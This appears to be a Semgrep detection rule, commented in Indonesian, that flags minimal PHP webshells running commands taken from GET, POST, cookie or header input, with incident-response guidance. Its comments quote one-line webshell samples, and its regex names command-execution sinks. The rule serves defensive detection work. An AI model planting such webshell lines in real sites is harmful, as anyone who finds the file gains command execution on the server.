  # korem 012 .data/ dan .log/: 46 berkas satu baris — `<?php
  # if($_GET["c"]){system($_GET["c"]." 2>&1");} ?>`, `$a=$_POST["cmd"];
  # passthru($a);` — sebelumnya hanya dilaporkan sebagai command injection
  # (CWE-78), sehingga tidak masuk daftar IOC/eradikasi. Berkas PHP yang
  # seluruh isinya hanya menjalankan perintah dari permintaan adalah
  # webshell, bukan kode aplikasi yang rentan.
  # Sumbernya juga header HTTP (`system($_SERVER["HTTP_CMD"])`) dan berkas
  # unggahan; sink-nya juga backtick dan move_uploaded_file. Berkas yang
  # sudah dinetralkan pemindai hosting (`tmp.php.quarantine`) tetap
  # dilaporkan: jejaknya dipakai untuk eradikasi dan menelusuri jalan masuk.
  - id: php-webshell-minimal-command-from-request
    languages: [regex]
    paths:
      include: ["*.php", "*.phtml", "*.inc", "*.php5", "*.php7", "*.quarantine", "*.suspected"]
    severity: ERROR
    message: >-
      Seluruh isi berkas ini (kurang dari 400 karakter) hanya menjalankan
      perintah sistem, kode, atau unggahan yang dikirim lewat permintaan —
      webshell minimal, bukan kode aplikasi. Siapa pun yang mengetahui
      alamatnya dapat menjalankan perintah di server. Tangani sebagai
      insiden: simpan salinannya, hapus, cari berkas serupa di folder yang
      sama (biasanya ditanam puluhan sekaligus dengan nama acak atau nama
      folder sistem), lalu telusuri cara berkas ini sampai ke server. Berkas
      berakhiran .quarantine/.suspected sudah dinetralkan pemindai hosting,
      tetapi tetap bukti bahwa webshell pernah ada.
    pattern-regex: (?s)\A\s*<\?php\b(?=.{0,400}\z)(?=.*?(\$_(GET|POST|REQUEST|COOKIE|FILES)\b|\$_SERVER\s*\[\s*["']HTTP_)).*?\K(\b(system|shell_exec|passthru|exec|popen|proc_open|assert|eval|move_uploaded_file)\s*\(|`)
    metadata:
      judul: "Webshell PHP minimal menjalankan perintah dari permintaan"
      category: security
      subcategory: [vuln]
      cwe: "CWE-506: Embedded Malicious Code"
      owasp: "A08:2021 - Software and Data Integrity Failures"
      confidence: HIGH
      likelihood: HIGH
      impact: HIGH
      technology: [php, wordpress]
      references:
        - https://attack.mitre.org/techniques/T1505/003/

